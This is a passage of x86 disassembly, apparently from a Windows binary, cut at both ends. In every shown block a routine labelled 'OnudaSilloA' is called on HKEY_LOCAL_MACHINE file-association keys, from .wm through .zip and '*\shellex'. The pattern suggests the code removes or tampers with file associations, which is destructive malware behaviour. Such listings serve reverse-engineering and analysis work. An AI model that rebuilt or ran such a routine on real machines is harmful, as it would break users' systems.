  push 0041C920h ; "SOFTWARE\Classes\.wm\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Eh
  push 0041C974h ; "SOFTWARE\Classes\.wm\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000001Fh
  push 0041C9C4h ; "SOFTWARE\Classes\.wm\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000020h
  push 0041CA28h ; "SOFTWARE\Classes\.wm\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000021h
  push 0041C4ECh ; "SOFTWARE\Classes\.wm"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000022h
  push 0041CA70h ; "SOFTWARE\Classes\.wma\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000023h
  push 0041CAC4h ; "SOFTWARE\Classes\.wma\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000024h
  push 0041CB14h ; "SOFTWARE\Classes\.wma\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000025h
  push 0041CB78h ; "SOFTWARE\Classes\.wma\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000026h
  push 0041CBC4h ; "SOFTWARE\Classes\.wma"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000027h
  push 0041CBF4h ; "SOFTWARE\Classes\.wmd\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000028h
  push 0041CC44h ; "SOFTWARE\Classes\.wmd\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000029h
  push 0041CCA8h ; "SOFTWARE\Classes\.wmd\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Ah
  push 0041CCF4h ; "SOFTWARE\Classes\.wmd"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Bh
  push 0041CD24h ; "SOFTWARE\Classes\.wmdb"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Ch
  push 0041CD58h ; "SOFTWARE\Classes\.wmf\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Dh
  push 0041CDACh ; "SOFTWARE\Classes\.wmf\OpenWithProgids"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Eh
  push 0041CE28h ; "SOFTWARE\Classes\.wmp\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000002Fh
  push 0041CE7Ch ; "SOFTWARE\Classes\.wmp"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000030h
  push 0041CEACh ; "SOFTWARE\Classes\.wms\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000031h
  push 0041CEFCh ; "SOFTWARE\Classes\.wms\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000032h
  push 0041CF60h ; "SOFTWARE\Classes\.wms\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000033h
  push 0041CFACh ; "SOFTWARE\Classes\.wms"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000034h
  push 0041D00Ch ; "SOFTWARE\Classes\.wmv\ShellEx\{BB2E617C-0920-11d1-9A0B-00C04FC2D6C1}"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000035h
  push 0041D09Ch ; "SOFTWARE\Classes\.wmv\ShellEx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000036h
  push 0041D0DCh ; "SOFTWARE\Classes\.wmv\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000037h
  push 0041D130h ; "SOFTWARE\Classes\.wmv\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000038h
  push 0041D180h ; "SOFTWARE\Classes\.wmv\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000039h
  push 0041D1E4h ; "SOFTWARE\Classes\.wmv\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Ah
  push 0041D230h ; "SOFTWARE\Classes\.wmv"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Bh
  push 0041D260h ; "SOFTWARE\Classes\.wmx\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Ch
  push 0041D2B4h ; "SOFTWARE\Classes\.wmx\OpenWithProgIds"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Dh
  push 0041D304h ; "SOFTWARE\Classes\.wmx\OpenWithList\wmplayer.exe"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Eh
  push 0041D368h ; "SOFTWARE\Classes\.wmx\OpenWithList"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000003Fh
  push 0041CFDCh ; "SOFTWARE\Classes\.wmx"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000040h
  push 0041D3B4h ; "SOFTWARE\Classes\.wmz\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000041h
  push 0041D408h ; "SOFTWARE\Classes\.wmz\OpenWithProgIds"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000042h
  push 0041D458h ; "SOFTWARE\Classes\.wmz\OpenWithList\wmplayer.exe"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000043h
  push 0041D4BCh ; "SOFTWARE\Classes\.wmz\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000044h
  push 0041D508h ; "SOFTWARE\Classes\.wmz"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000045h
  push 0041D538h ; "SOFTWARE\Classes\.wpd\WPWin6.1File\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000046h
  push 0041D594h ; "SOFTWARE\Classes\.wpd\WPWin6.1File"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000047h
  push 0041D5E0h ; "SOFTWARE\Classes\.wpd"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000048h
  push 0041D610h ; "SOFTWARE\Classes\.wpg\WPDraw30.Drawing\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000049h
  push 0041D674h ; "SOFTWARE\Classes\.wpg\WPDraw30.Drawing"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Ah
  push 0041D6C8h ; "SOFTWARE\Classes\.wpg\WPDraw30.Chart\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Bh
  push 0041D728h ; "SOFTWARE\Classes\.wpg\WPDraw30.Chart"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Ch
  push 0041D77Ch ; "SOFTWARE\Classes\.wpg\TextArt.Document\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Dh
  push 0041D7E0h ; "SOFTWARE\Classes\.wpg\TextArt.Document"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Eh
  push 0041D834h ; "SOFTWARE\Classes\.wpg"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000004Fh
  push 0041D864h ; "SOFTWARE\Classes\.wpl\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000050h
  push 0041D8B4h ; "SOFTWARE\Classes\.wpl\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000051h
  push 0041D918h ; "SOFTWARE\Classes\.wpl\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000052h
  push 0041D964h ; "SOFTWARE\Classes\.wpl"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000053h
  push 0041D994h ; "SOFTWARE\Classes\.wri\OpenWithList\WordPad.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000054h
  push 0041D9F8h ; "SOFTWARE\Classes\.wri\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000055h
  push 0041DA44h ; "SOFTWARE\Classes\.wri"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000056h
  push 0041DA74h ; "SOFTWARE\Classes\.wsc"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000057h
  push 0041DAA4h ; "SOFTWARE\Classes\.WSF"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000058h
  push 0041DAD4h ; "SOFTWARE\Classes\.WSH"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000059h
  push 0041DB38h ; "SOFTWARE\Classes\.wsz\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Ah
  push 0041DB8Ch ; "SOFTWARE\Classes\.wsz"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Bh
  push 0041DBBCh ; "SOFTWARE\Classes\.wtx\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Ch
  push 0041DC10h ; "SOFTWARE\Classes\.wtx"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Dh
  push 0041DC40h ; "SOFTWARE\Classes\.wvx\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Eh
  push 0041DC94h ; "SOFTWARE\Classes\.wvx\OpenWithProgIds"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000005Fh
  push 0041DD14h ; "SOFTWARE\Classes\.wvx\OpenWithList\wmplayer.exe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000060h
  push 0041DD78h ; "SOFTWARE\Classes\.wvx\OpenWithList"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000061h
  push 0041DDC4h ; "SOFTWARE\Classes\.wvx"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000062h
  push 0041DDF4h ; "SOFTWARE\Classes\.x"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000063h
  push 0041DE20h ; "SOFTWARE\Classes\.xbm\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000064h
  push 0041DE74h ; "SOFTWARE\Classes\.xbm"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000065h
  push 0041DEA4h ; "SOFTWARE\Classes\.xfm"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000066h
  push 0041DCE4h ; "SOFTWARE\Classes\.xht"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000067h
  push 0041DB04h ; "SOFTWARE\Classes\.xhtml"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000068h
  push 0041DED4h ; "SOFTWARE\Classes\.xix\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000069h
  push 0041DF28h ; "SOFTWARE\Classes\.xix"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Ah
  push 0041DF58h ; "SOFTWARE\Classes\.xlb\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Bh
  push 0041DFACh ; "SOFTWARE\Classes\.xlb"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Ch
  push 0041DFDCh ; "SOFTWARE\Classes\.xlc\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Dh
  push 0041E030h ; "SOFTWARE\Classes\.xlc"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Eh
  push 0041E060h ; "SOFTWARE\Classes\.xls\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000006Fh
  push 0041E0B8h ; "SOFTWARE\Classes\.xls\ExcelWorksheet\ShellNew"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000070h
  push 0041E118h ; "SOFTWARE\Classes\.xls\ExcelWorksheet"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000071h
  push 0041E168h ; "SOFTWARE\Classes\.xls\Excel.Sheet.5\ShellNew"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000072h
  push 0041E1C8h ; "SOFTWARE\Classes\.xls\Excel.Sheet.5"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000073h
  push 0041E214h ; "SOFTWARE\Classes\.xls"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000074h
  push 0041E244h ; "SOFTWARE\Classes\.xlt\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000075h
  push 0041E298h ; "SOFTWARE\Classes\.xlt"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000076h
  push 0041E2C8h ; "SOFTWARE\Classes\.xml\PersistentHandler"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000077h
  push 0041E31Ch ; "SOFTWARE\Classes\.xml"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000078h
  push 0041E34Ch ; "SOFTWARE\Classes\.xsl\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000079h
  push 0041E3A0h ; "SOFTWARE\Classes\.xsl"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Ah
  push 0041E3D0h ; "SOFTWARE\Classes\.xxe"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Bh
  push 0041E400h ; "SOFTWARE\Classes\.z\PersistentHandler"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Ch
  push 0041CDFCh ; "SOFTWARE\Classes\.z"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Dh
  push 0041E450h ; "SOFTWARE\Classes\.z96\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Eh
  push 0041E4A4h ; "SOFTWARE\Classes\.z96"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 0000007Fh
  push 0041E4D4h ; "SOFTWARE\Classes\.zap"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000080h
  push 0041E504h ; "SOFTWARE\Classes\.ZFSendToTarget\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000081h
  push 0041E570h ; "SOFTWARE\Classes\.ZFSendToTarget"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000082h
  push 0041E5B8h ; "SOFTWARE\Classes\.zip\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000083h
  push 0041E62Ch ; "SOFTWARE\Classes\.zip\PersistentHandler"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000084h
  push 0041E680h ; "SOFTWARE\Classes\.zip\OpenWithProgids"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000085h
  push 0041E6D0h ; "SOFTWARE\Classes\.zip\CompressedFolder\ShellNew"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000086h
  push 0041E734h ; "SOFTWARE\Classes\.zip\CompressedFolder"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000087h
  push 0041E788h ; "SOFTWARE\Classes\.zip"
  lea eax, var_24
  push eax
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000088h
  push 0041E7B8h ; "SOFTWARE\Classes\*\OpenWithList"
  lea ecx, var_24
  push ecx
  call [00401188h]
  push eax
  push 80000002h
  call 004193DCh ; OnudaSilloA()
  call [00401054h]
  lea ecx, var_24
  call [004011CCh]
  mov var_4, 00000089h
  push 0041E7FCh ; "SOFTWARE\Classes\*\shellex"
  lea edx, var_24
  push edx
  call [00401188h]
  push eax
  push 80000002h
